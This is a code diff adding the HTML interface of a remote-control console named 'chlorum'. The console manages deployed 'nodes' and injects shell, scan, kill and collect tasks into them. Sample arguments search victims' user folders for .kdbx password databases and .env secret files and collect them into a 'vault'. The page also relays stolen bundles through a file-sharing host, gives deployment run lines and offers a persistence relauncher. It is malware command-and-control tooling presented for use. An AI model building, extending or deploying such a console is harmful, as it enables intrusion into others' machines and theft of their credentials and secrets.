@@ -1,0 +1,181 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>chlorum — phosphor console</title>
+<link rel="stylesheet" href="/style.css">
+</head>
+<body>
+<div class="scanlines"></div>
+
+<header class="topbar">
+  <div class="brand">
+    <span class="element-box">Cl<span class="mass">35.45</span></span>
+    <span class="brand-name">chlorum</span>
+    <span class="chip">cl-35</span>
+  </div>
+  <div class="top-status">
+    <span id="pulse" class="pulse-dot"></span>
+    <span id="operator-label">—</span>
+    <button id="btn-logout" class="btn ghost">eject</button>
+  </div>
+</header>
+
+<nav class="tabs">
+  <button class="tab active" data-view="nodes">nodes</button>
+  <button class="tab" data-view="tasks">tasks</button>
+  <button class="tab" data-view="logs">logs</button>
+  <button class="tab" data-view="vault">vault</button>
+  <button class="tab" data-view="archive">archive</button>
+  <button class="tab" data-view="deploy">deploy</button>
+</nav>
+
+<main>
+
+  <!-- NODES -->
+  <section id="view-nodes" class="view active">
+    <div class="section-head">
+      <h2>registered nodes</h2>
+      <span class="hint">heartbeat every 10s ± jitter</span>
+    </div>
+    <div id="agent-grid" class="grid"></div>
+  </section>
+
+  <!-- TASKS -->
+  <section id="view-tasks" class="view">
+    <div class="section-head">
+      <h2>task injector</h2>
+      <span class="hint">validated at the console, executed at the node</span>
+    </div>
+    <div class="panel">
+      <div class="field-row">
+        <label>node
+          <select id="task-agent"></select>
+        </label>
+        <label>type
+          <select id="task-type">
+            <option value="probe">probe</option>
+            <option value="scan">scan</option>
+            <option value="shell">shell</option>
+            <option value="kill">kill</option>
+            <option value="collect">collect</option>
+          </select>
+        </label>
+      </div>
+      <label class="field">args <span class="hint">(JSON, per type)</span>
+        <textarea id="task-args" rows="4" spellcheck="false"></textarea>
+      </label>
+      <div class="field-row">
+        <button id="btn-inject" class="btn primary">inject task</button>
+        <span id="task-feedback" class="hint"></span>
+      </div>
+      <div class="arg-recipes hint">
+        <div>scan → <code>{"root":"C:\\Users","ext":[".kdbx",".env"],"limit":500}</code></div>
+        <div>shell → <code>{"cmd":"whoami"}</code></div>
+        <div>collect → <code>{"paths":["C:\\Users\\x\\notes.env","C:\\secrets\\vault.kdbx"]}</code></div>
+      </div>
+    </div>
+    <div class="section-head"><h2>recent tasks</h2><span class="hint">click a task id for its captured result</span></div>
+    <table class="table" id="task-table">
+      <thead><tr><th>node</th><th>task</th><th>type</th><th>state</th><th>issued</th></tr></thead>
+      <tbody></tbody>
+    </table>
+    <div id="task-modal" class="modal hidden">
+      <div class="modal-box">
+        <div class="modal-head"><span id="task-title"></span><button id="task-close" class="btn ghost">close</button></div>
+        <pre id="task-result"></pre>
+      </div>
+    </div>
+  </section>
+
+  <!-- LOGS -->
+  <section id="view-logs" class="view">
+    <div class="section-head">
+      <h2>log stream</h2>
+      <label class="inline">node filter <select id="log-agent"><option value="">all</option></select></label>
+    </div>
+    <div id="log-stream" class="log-stream"></div>
+  </section>
+
+  <!-- VAULT -->
+  <section id="view-vault" class="view">
+    <div class="section-head">
+      <h2>sealed vault</h2>
+      <span class="hint">ChaCha20-Poly1305 at rest; opened on demand</span>
+      <label class="inline">node filter <select id="vault-agent"><option value="">all</option></select></label>
+    </div>
+    <table class="table" id="vault-table">
+      <thead><tr><th>node</th><th>file</th><th>kind</th><th>bytes</th><th>sealed</th><th></th></tr></thead>
+      <tbody></tbody>
+    </table>
+    <div id="vault-modal" class="modal hidden">
+      <div class="modal-box">
+        <div class="modal-head"><span id="vault-title"></span><button id="vault-close" class="btn ghost">close</button></div>
+        <pre id="vault-preview"></pre>
+        <a id="vault-download" class="btn primary" href="#" download>download raw</a>
+      </div>
+    </div>
+  </section>
+
+  <!-- ARCHIVE -->
+  <section id="view-archive" class="view">
+    <div class="section-head">
+      <h2>disposable archive</h2>
+      <span class="hint">gofile relay of hypochlorite bundles</span>
+    </div>
+    <table class="table" id="archive-table">
+      <thead><tr><th>sealed</th><th>file</th><th>bytes</th><th>link</th></tr></thead>
+      <tbody></tbody>
+    </table>
+    <div id="archive-empty" class="hint">nothing relayed yet.</div>
+  </section>
+
+  <!-- DEPLOY -->
+  <section id="view-deploy" class="view">
+    <div class="section-head">
+      <h2>deploy a node</h2>
+      <span class="hint">mint an identity, host the console, run the line</span>
+    </div>
+    <div class="panel">
+      <button id="btn-mint" class="btn primary">mint deployment identity</button>
+      <div id="mint-output" class="mint hidden">
+        <div class="mint-id">task id: <code id="mint-taskid"></code></div>
+        <details>
+          <summary>console hosting (do this first)</summary>
+          <pre>1. create an account on your node hosting platform
+   https://vercel.com/signup  (or any Node host you control)
+
+2. push this repository, set the env vars from .env.example
+   (CHLORUM_ADMIN_TOKEN is mandatory), deploy.
+
+3. the console answers on your deployment URL — that base
+   URL goes into the run line below.</pre>
+        </details>
+        <details>
+          <summary>node run line (windows)</summary>
+          <pre id="mint-windows"></pre>
+        </details>
+        <details>
+          <summary>node run line (unix)</summary>
+          <pre id="mint-unix"></pre>
+        </details>
+        <p class="hint">identities are stateless: the console derives everything
+        from the task id. losing the master token invalidates every
+        outstanding node at once.</p>
+        <p class="hint">persistence is opt-in on the node: set <code>CHLORUM_PERSIST=1</code>
+        in the node environment to install the perchlorate relauncher on first
+        boot. without it the node runs plain, and <code>kill</code> simply exits.</p>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer class="foot">
+  <span>chlorum console · cl-35 · zero third-party dependencies</span>
+</footer>
+
+<script src="/app.js"></script>
+</body>
+</html>
